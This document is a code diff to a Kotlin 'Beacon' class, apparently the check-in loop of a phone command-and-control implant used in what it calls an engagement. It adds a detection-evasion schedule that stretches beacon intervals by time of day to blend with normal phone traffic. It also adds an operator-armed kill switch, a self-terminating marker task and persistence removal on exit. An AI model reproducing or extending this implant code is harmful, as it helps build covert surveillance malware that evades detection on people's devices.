@@ -33,6 +33,9 @@ class Beacon(
     private var sleepObfuscate = true
     private var failures = 0
 
+    /** The state of the evasion engine: the schedule and the kill switch. */
+    private var evasion = Evasion.load(config.stateDir)
+
     /**
      * Start the loop. Refuses if a thread still exists: two live loops would
      * share one session and violate the SEND-SERIAL invariant (frames must
@@ -97,6 +100,16 @@ class Beacon(
     private fun loop() {
         while (running.get()) {
             try {
+                // The state of the engine is read again every cycle: the
+                // operator may have armed the kill switch since the last
+                // check-in.
+                evasion = Evasion.load(config.stateDir)
+                val reason = Evasion.killSwitch(evasion)
+                if (reason != null) {
+                    log("the kill switch fired: $reason")
+                    running.set(false)
+                    break
+                }
                 if (cycle()) {
                     sleep = sleep.coerceIn(1, 86400)
                     val interval = nextIntervalSeconds()
@@ -134,7 +147,10 @@ class Beacon(
      * signature of its own.
      */
     private fun nextIntervalSeconds(): Long {
-        val base = sleep.toDouble()
+        // The schedule of the day stretches the interval: the phone is busy
+        // while the office is open and quiet at night.
+        val factor = Evasion.factor(evasion).coerceAtLeast(0.1)
+        val base = sleep.toDouble() * factor
         val j = jitter.coerceIn(0, 90) / 100.0
         val lo = (base * (1.0 - j)).coerceAtLeast(1.0)
         val hi = (base * (1.0 + j)).coerceAtLeast(lo)
@@ -289,10 +305,36 @@ class Beacon(
                 continue
             }
             log("task $id kind=$kind")
+            // The marker of the kill switch: the operator sends it and the
+            // implant stops existing.
+            if (Evasion.markerFired(evasion, args)) {
+                ch.writeFrame(
+                    sess.sealValue(
+                        Wire.MSG_RESULT,
+                        TaskRunner.Outcome(0, ByteArray(0), "the kill switch fired").toValue(id),
+                    )
+                )
+                bye()
+                running.set(false)
+                return false
+            }
             when (kind) {
                 "exit", "kill" -> {
-                    ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, TaskRunner.run(kind, args).toValue(id)))
+                    // The exit takes the persistence entries with it: the
+                    // empty record travels with the result, so the server
+                    // does not keep a lie after the engagement.
+                    val outcome = TaskRunner.run(kind, args)
+                        .with("persist", Upk.Arr(emptyList()))
+                        .with("persist_total", Upk.num(0))
+                        .with("persist_broken", Upk.num(0))
+                    ch.writeFrame(sess.sealValue(Wire.MSG_RESULT, outcome.toValue(id)))
                     bye()
+                    // The exit is the last word of the operator: the
+                    // implant takes its persistence entries with it, so the
+                    // phone is left the way it was found.  This is also the
+                    // path the panic task of the server takes.
+                    TaskRunner.removePersistence()
+                    running.set(false)
                     return false
                 }
                 "sleep" -> {
